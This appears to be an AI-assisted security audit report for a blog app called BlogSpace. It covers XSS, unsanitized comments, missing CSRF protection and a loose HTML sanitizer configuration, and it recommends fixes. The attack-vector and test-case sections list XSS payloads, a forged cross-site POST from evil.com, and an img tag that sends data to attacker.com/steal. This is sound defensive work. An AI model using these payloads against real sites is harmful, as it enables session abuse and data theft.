# Security Audit Report - BlogSpace

**Date:** June 28, 2026  
**Status:** ⚠️ VULNERABILITIES FOUND  
**Severity:** HIGH

---

## Executive Summary

This audit examined input sanitization, XSS prevention, and CSRF protection across the BlogSpace platform. **2 HIGH-severity vulnerabilities and 1 MEDIUM-severity issue were identified.**

---

## 1. XSS Vulnerability in Frontend Post Display ⚠️ HIGH

### Issue
**File:** `frontend/src/pages/PostDetail.tsx` (Line 125)  
**File:** `frontend/src/components/posts/PostEditor.tsx` (Line 101)

The frontend uses `dangerouslySetInnerHTML` to render post content:

```tsx
<div
  className="prose prose-gray dark:prose-invert max-w-none mb-10"
  dangerouslySetInnerHTML={{ __html: post.content }}
/>
```

**Risk:** While the backend sanitizes HTML via `sanitize-html`, storing HTML in the database and rendering it client-side with `dangerouslySetInnerHTML` bypasses React's built-in XSS protections. If the backend sanitization is ever misconfigured or bypassed, malicious JavaScript can execute.

### Example Attack Vector
1. Admin misconfigures sanitize options to allow `<script>` tags
2. Attacker publishes post with `<script>alert('XSS')</script>`
3. Frontend renders unsanitized HTML → XSS executes

### Root Cause
- **PostEditor.tsx (Line 101):** Preview uses `dangerouslySetInnerHTML` with rich text content
- **PostDetail.tsx (Line 125):** Display uses `dangerouslySetInnerHTML` without secondary validation

---

## 2. Missing Comment Sanitization ⚠️ HIGH

### Issue
**File:** `backend/src/controllers/comment.controller.ts` (Lines 27-29)

Comments are **NOT sanitized** before storage:

```typescript
const comment = await prisma.comment.create({
  data: { content, postId: req.params.postId, authorId: req.user!.id },
  // ☝️ NO sanitization applied
});
```

**Risk:** Users can store and display arbitrary HTML/JavaScript in comments. Even without React rendering with `dangerouslySetInnerHTML`, comment text could contain XSS payloads.

### Example Attack Vector
1. Attacker creates comment: `I love this post <img src=x onerror="alert('XSS')">`
2. Comment is stored as-is in database
3. If frontend ever renders comments with HTML (e.g., via `dangerouslySetInnerHTML`), XSS fires

### Root Cause
- No sanitization middleware/utility applied to comment input
- Comment schema validates length but not content type

---

## 3. CSRF Vulnerability ⚠️ MEDIUM-HIGH

### Issue
**File:** `backend/src/index.ts` (Lines 15-22)

CSRF protection is missing. The app uses cookies for authentication but has no CSRF tokens:

```typescript
app.use(
  cors({
    origin: process.env.CLIENT_URL || "http://localhost:5173",
    credentials: true,
  })
);
// ☝️ No CSRF middleware (e.g., csurf)
```

**Risk:** Cross-site request forgery attacks. An attacker on `evil.com` can:
1. Trick a logged-in user into visiting `evil.com`
2. Send a forged POST request to `/api/v1/posts` on behalf of the user
3. Create/modify/delete posts without the user's knowledge

### Example Attack Vector
```html
<!-- On attacker's evil.com -->
<img src="http://localhost:5000/api/v1/posts" 
     style="display:none;" 
     onerror="fetch('http://localhost:5000/api/v1/posts', {
       method: 'POST',
       credentials: 'include',
       body: JSON.stringify({title: 'Hacked!', content: '...'})
     })" />
```

The browser sends the victim's auth cookie, bypassing auth checks.

### Why SameSite Cookies Alone Aren't Enough
```typescript
const COOKIE_OPTIONS = {
  httpOnly: true,
  secure: process.env.NODE_ENV === "production",
  sameSite: "lax" as const,  // ☝️ Not "strict"
  maxAge: 7 * 24 * 60 * 60 * 1000,
};
```

- `sameSite: "lax"` allows cookies on top-level navigations (cross-site form submissions)
- Safe for state-changing requests (`POST`, `PUT`, `DELETE`) only if SameSite is "strict"
- A comprehensive CSRF token system is the industry standard

---

## 4. Weak Sanitization Configuration ⚠️ MEDIUM

### Issue
**File:** `backend/src/controllers/post.controller.ts` (Lines 15-23)

The sanitization whitelist is too permissive:

```typescript
const sanitizeOptions: sanitizeHtml.IOptions = {
  allowedTags: sanitizeHtml.defaults.allowedTags.concat(["img", "h1", "h2", "iframe"]),
  allowedAttributes: {
    ...sanitizeHtml.defaults.allowedAttributes,
    img: ["src", "alt", "width", "height"],
    iframe: ["src", "width", "height", "frameborder", "allowfullscreen"],
    "*": ["class", "style"],  // ☝️ Allows "style" on ANY tag
  },
};
```

**Risks:**
- `iframe` tag allows external content (ads, malware, phishing)
- `"*": ["class", "style"]` allows CSS injection → data exfiltration or UI tampering
- `src` on `img` can load cross-origin images → phishing

### Example Attack Vector
```html
<img src="https://attacker.com/steal?data=" 
     style="width:1px;height:1px;" />
<!-- Attacker's server logs all page visitors -->

<img src="x" 
     style="background: url('javascript:alert(1)')" />
<!-- CSS-based XSS in some browsers -->

<iframe src="https://attacker.com/phishing"></iframe>
<!-- Embedded phishing form -->
```

---

## 5. Validation Gaps

### Issue A: Comment Content Not Validated for HTML
**File:** `backend/src/schemas/comment.schema.ts`

Comments allow raw strings but don't validate whether they contain HTML:
```typescript
export const createCommentSchema = z.object({
  content: z.string().min(1, "Comment cannot be empty").max(2000),
  // ☝️ No HTML stripping or sanitization
});
```

### Issue B: Post Title/Excerpt Not Sanitized
**File:** `backend/src/controllers/post.controller.ts` (Line 99)

Only `content` is sanitized; `title`, `excerpt`, and `markdown` are not:
```typescript
const sanitized = sanitizeHtml(content, sanitizeOptions);
// title, excerpt, markdown stored as-is ☝️
```

---

## Recommended Fixes

### IMMEDIATE (P0 - Deploy ASAP)

1. **Add CSRF Protection** → Use `csurf` middleware + double-submit cookies
2. **Sanitize Comments** → Apply sanitization to comment input
3. **Add comment sanitization to rendering** → Strip/escape HTML in frontend

### SHORT-TERM (P1 - Deploy Next Sprint)

4. **Harden Sanitization Config** → Remove `iframe`, restrict `style` attribute
5. **Use Safe HTML Rendering Library** → Replace `dangerouslySetInnerHTML` with `html-to-react` + validation
6. **Sanitize All Text Fields** → Apply to title, excerpt, markdown, avatar URLs

### ONGOING (P2 - Long-term)

7. **Content Security Policy (CSP)** → Add CSP headers to prevent inline scripts
8. **Rate Limiting Enhancements** → Stricter limits on post/comment creation
9. **Security Testing** → Add OWASP Top 10 tests to CI/CD
10. **Security Headers** → Add X-Frame-Options, X-Content-Type-Options, etc.

---

## Test Cases (Vulnerable Payloads)

### XSS Payloads to Test Against

```javascript
// Should be blocked:
"<script>alert('XSS')</script>"
"<img src=x onerror='alert(1)'>"
"<svg onload='alert(1)'>"
"<iframe src='javascript:alert(1)'></iframe>"
"<body onload='alert(1)'>"
"<style>* { background: url('javascript:alert(1)') }</style>"
"<a href='javascript:alert(1)'>Click me</a>"
"<input onfocus='alert(1)' autofocus>"

// CSRF: Forged POST from evil.com to localhost:5000/api/v1/posts
fetch('http://localhost:5000/api/v1/posts', {
  method: 'POST',
  credentials: 'include', // Browser sends auth cookie
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ title: 'Hacked', content: '...' })
})
```

---

## Compliance Impact

- **OWASP Top 10:** A03:2021 – Injection, A07:2021 – Cross-Site Scripting (XSS)
- **GDPR:** User content compromise via XSS could leak personal data
- **PCI-DSS:** If payment data ever stored, XSS is critical failure
- **SOC 2:** Requires documented security controls for input validation

---

## Files Affected Summary

| File | Issue | Severity |
|------|-------|----------|
| `frontend/src/pages/PostDetail.tsx` | XSS via `dangerouslySetInnerHTML` | HIGH |
| `frontend/src/components/posts/PostEditor.tsx` | XSS in preview | HIGH |
| `backend/src/controllers/comment.controller.ts` | Missing comment sanitization | HIGH |
| `backend/src/index.ts` | No CSRF protection | HIGH |
| `backend/src/controllers/post.controller.ts` | Weak sanitization config | MEDIUM |
| `backend/src/schemas/comment.schema.ts` | No HTML validation | MEDIUM |

---

## Next Steps

1. ✅ Review this audit report with the team
2. 🔧 Apply fixes in order of priority (P0 → P1 → P2)
3. 🧪 Test payloads from "Test Cases" section against fixed code
4. 📝 Update security documentation in `SECURITY.md`
5. 🔄 Run security tests in CI/CD pipeline
6. 🛡️ Schedule quarterly security reviews

---

**Generated by:** GitHub Copilot Security Audit  
**Reviewed by:** Manual code inspection  
**Next audit:** September 28, 2026
